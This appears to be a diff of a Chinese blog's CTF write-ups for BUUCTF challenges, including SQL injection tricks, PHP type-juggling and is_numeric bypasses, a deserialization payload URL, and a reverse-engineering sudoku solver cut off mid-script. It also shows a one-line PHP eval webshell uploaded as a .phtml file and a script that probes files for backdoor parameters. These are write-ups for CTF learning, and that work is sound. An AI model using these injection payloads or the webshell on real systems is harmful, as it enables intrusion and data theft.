+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;;</span><br><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line">desc  words;#</span><br></pre></td></tr></table></figure>
+<p>再操作取得flag：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p>flag： flag{6804a2d0-bcbf-4f1c-8785-d1f241519712}</p>
+<p><strong>方法二：预处理</strong></p>
+<p>字符串转十六进制：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;</span><br></pre></td></tr></table></figure>
+<p>=&gt; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">SeT @s2h &#x3D; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare ss from @s2h;</span><br><span class="line">execute ss;</span><br></pre></td></tr></table></figure>
+<p>(SeT 绕过过滤函数）<br>成功获得flag</p>
+<p><strong>方法三：handler查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;1919810931114514&#96; open;</span><br><span class="line">handler &#96;1919810931114514&#96; read first;#</span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>]]></content>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>原理：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>
+<p>非预期解：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
+<p>预期解：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;</span><br><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT;</span><br><span class="line">select 1</span><br></pre></td></tr></table></figure>
+<p>解释：mysql缺省不支持oracle将 || 解释为字符串拼接，第二行启用了兼容设置</p>
+<p>flag{13a1a49a-d096-4a5b-aac0-ef90df2f1b2c}</p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>随便试一下就过了。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>URL:<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
+<p>flag{d1d4ffc6-0e42-4ae0-b177-985390fbf756}</p>
+]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
@@ -888,34 +727,76 @@
       </tags>
   </entry>
   <entry>
-    <title>[安洵杯 2019]game WriteUp</title>
-    <url>/2020/09/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game-WriteUp/</url>
-    <content><![CDATA[<hr>
-<a id="more"></a>
+    <title>week20200803-20200809</title>
+    <url>/2020/08/06/week20200803-20200809/</url>
+    <content><![CDATA[<h1 id="Week-4-lt-2020-08-03-2020-08-09-gt"><a href="#Week-4-lt-2020-08-03-2020-08-09-gt" class="headerlink" title="Week 4&lt;2020.08.03 - 2020.08.09&gt;"></a>Week 4&lt;2020.08.03 - 2020.08.09&gt;</h1><a id="more"></a>
 
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>网页给出提示<strong>Try to find out source file!</strong><br>访问备份文件：/index.php.bak<br>源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即：<br>以GET方式传参，key值等于”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”（字符串）<br>key值要求为数字</p>
 <p>考点：</p>
-<p>控制流平坦化</p>
-<p>反编译main函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ST38_4</span></span><br><span class="line">  __int64 v5; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input your flag:"</span>, argv, envp);</span><br><span class="line">  gets(&amp;v8);								<span class="comment">// 输入</span></span><br><span class="line">  v10 = general_inspection((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">  v7 = <span class="number">-1804515313</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v7 == <span class="number">-2071121728</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = blank_num((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">        v5 = mem_alloc(v4);</span><br><span class="line">        trace(sudoku, v5, v4);</span><br><span class="line">        check((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">        check1(&amp;v8);						<span class="comment">// 加密</span></span><br><span class="line">        check3(&amp;v8);						<span class="comment">// 加密 调用了check2()</span></span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">-303742386</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">-1804515313</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = <span class="number">-2071121728</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">        v3 = <span class="number">664169471</span>;</span><br><span class="line">      v7 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-303742386</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">664169471</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">      check((<span class="keyword">int</span> (*)[<span class="number">9</span>])sudoku);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="number">-303742386</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
+</blockquote>
+<p>payload: /?key=123</p>
+<p>flag{32bbbcc8-df1b-419c-b0f7-fc8fe3bd9e48}</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
+<p>网页源代码注意到：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/image-20200806022344298.png" alt="image-20200806022344298"></p>
+<p>repeater：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025631219.png" alt="image-20200806025631219"></p>
+<p>绕过<code>is_numeric()</code>的方法：</p>
+<blockquote>
+<p><strong>php中的is_numeric()漏洞</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
+</blockquote>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025600159.png" alt="image-20200806025600159"></p>
+<p>提示 <strong>Flag need your 100000000 money</strong></p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025538945.png" alt="image-20200806025538945"></p>
+<p>注：这里也可以用科学计数法绕过<br><img src="/2020/08/06/week20200803-20200809/image-20200806025510788.png" alt="image-20200806025510788"></p>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>随便上传一个文件</p>
+<p>报错：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810024847689.png" alt="image-20200810024847689"></p>
+<p>抓包，修改后缀为.phtml，内容是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'ye'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传成功</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025324304.png" alt="image-20200810025324304"></p>
+<p>蚁剑连接，在根目录下找到flag</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025309017.png" alt="image-20200810025309017"></p>
+<p>flag{9b3cc74d-daad-4ad2-a788-82c9d0c3ec16}</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>网页代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>python代码还原逻辑：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span><span class="params">()</span>:</span></span><br><span class="line">	v16 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">		v16.append(flag[v15] <span class="number">-48</span> )</span><br><span class="line">        <span class="comment">#这个位置其实是数字得char和int转化</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">if</span>  dog3[<span class="number">9</span> * i + j] == <span class="number">0</span>:</span><br><span class="line">				dog3[<span class="number">9</span> *i + i] = v16[v13]</span><br><span class="line">				v13 += <span class="number">1</span></span><br><span class="line">                <span class="comment">#这里形成一个数独游戏得填入</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">			<span class="keyword">if</span> dog3[<span class="number">9</span> * i + j] != sudoku[<span class="number">9</span> * i + j]:</span><br><span class="line">                <span class="comment"># 关键比较</span></span><br><span class="line">				print(<span class="string">"!!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check1</span><span class="params">()</span>:</span></span><br><span class="line">	v12 = len(flag)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)&gt;&gt;<span class="number">1</span>):</span><br><span class="line">		(flag[i],flag[v12+<span class="number">1</span>]) = (flag[v12+<span class="number">1</span>],flag[i])</span><br><span class="line">		<span class="comment">#前后两部分互换</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">		(flag[i],flag[i+<span class="number">1</span>]) = (flag[i+<span class="number">1</span>],flag[i])</span><br><span class="line">		<span class="comment">#两位之间互换</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">		flag[i] = ((flag[i]&amp;<span class="number">0xf3</span>)|(~flag[i]&amp;<span class="number">0xc</span>)) - <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转自 https://blog.csdn.net/wlz_lc_4/article/details/103466957</span></span><br></pre></td></tr></table></figure>
 
-<p>解题的关键就是找到原来的数独，和填好的数独，提取填好的数字，然后做check1中的逆向操作就可以得到flag</p>
-<p>最终是比较dog3和sudoku里的值，dog3是已知部分填充部分，sudoku需要动态调试得知填入的值</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000604300                 public D0g3</span><br><span class="line">.data:0000000000604300 ; _DWORD D0g3[81]</span><br><span class="line">.data:0000000000604300 D0g3            dd 1, 0, 5, 3, 2, 7, 2 dup(0), 2 dup(8), 0, 9, 0, 5, 2 dup(0)</span><br><span class="line">.data:0000000000604300                                         ; DATA XREF: check2(char *)+462↑o</span><br><span class="line">.data:0000000000604300                                         ; check2(char *):loc_402F53↑o ...</span><br><span class="line">.data:0000000000604300                 dd 2, 2 dup(0), 7, 2 dup(0), 1, 0, 5, 0, 3, 4, 9, 0, 1</span><br><span class="line">.data:0000000000604300                 dd 2 dup(0), 3, 3 dup(0), 1, 2 dup(0), 7, 0, 9, 0, 6, 7</span><br><span class="line">.data:0000000000604300                 dd 0, 3, 2, 9, 0, 4, 8, 2 dup(0), 6, 0, 5, 4, 0, 8, 0</span><br><span class="line">.data:0000000000604300                 dd 9, 2 dup(0), 4, 2 dup(0), 1, 0, 3, 2 dup(0), 2, 1, 0</span><br><span class="line">.data:0000000000604300                 dd 3, 0, 7, 0, 4</span><br><span class="line">.data:0000000000604300 _data           ends</span><br><span class="line">.data:0000000000604300</span><br></pre></td></tr></table></figure>
+<p>payload:<br><a href="http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D" target="_blank" rel="noopener">http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</a></p>
+<p>flag{77a1ae97-c1ad-44d3-b1e0-99c77f190391}</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>利用脚本寻找利用点</p>
+<p>分析脚本（转载<a href="https://blog.csdn.net/a3320315/article/details/102945940）" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940）</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  		<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)											<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>						<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>										<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()											<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:						<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()							<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()						<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:							<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:													<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
 
-
-<p>逆向脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudoku = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>]</span><br><span class="line">dog3 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">81</span>):</span><br><span class="line">    <span class="keyword">if</span> sudoku[i] != dog3[i]:</span><br><span class="line">        tmp = ord(str(sudoku[i])) + <span class="number">20</span></span><br><span class="line">        flag.append( tmp&amp;<span class="number">0xf3</span> | ~tmp&amp;<span class="number">0xc</span> )</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">40</span>,<span class="number">2</span>):</span><br><span class="line">    (flag[i], flag[i+<span class="number">1</span>]) = (flag[i+<span class="number">1</span>], flag[i]) <span class="comment">#两位操作</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    (flag[i],flag[i+<span class="number">20</span>]) = (flag[i+<span class="number">20</span>], flag[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    